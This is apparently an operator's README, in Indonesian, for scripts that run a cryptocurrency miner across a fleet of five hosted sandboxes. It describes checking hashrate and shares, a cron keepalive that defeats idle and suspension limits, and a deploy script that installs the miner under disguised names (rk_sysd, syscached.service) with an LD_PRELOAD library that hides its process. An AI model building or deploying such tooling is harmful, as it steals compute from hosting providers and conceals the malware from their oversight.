# ops/instabox — kontrol fleet sandbox instabox.sh

Dipasang di vps1 (~/.instabox/). API key di ~/.instabox/env (ibk_...).

- sandbox-status.sh   — status 5 sandbox: state, service miner, hashrate, shares, worker, sisa runtime 8 jam
- instabox-keepalive.sh — cron */5: reset idle (30m), resume suspended, start stopped; log ~/.instabox/keepalive.log
- sandbox-deploy.sh WORKER — pasang miner ke sandbox: /usr/local/bin/rk_sysd + hideproc.so (LD_PRELOAD) + unit syscached.service + hugepages

Paket binary: build sekali di sandbox, tar (xcb + hideproc.so), sebar via instabox cp.
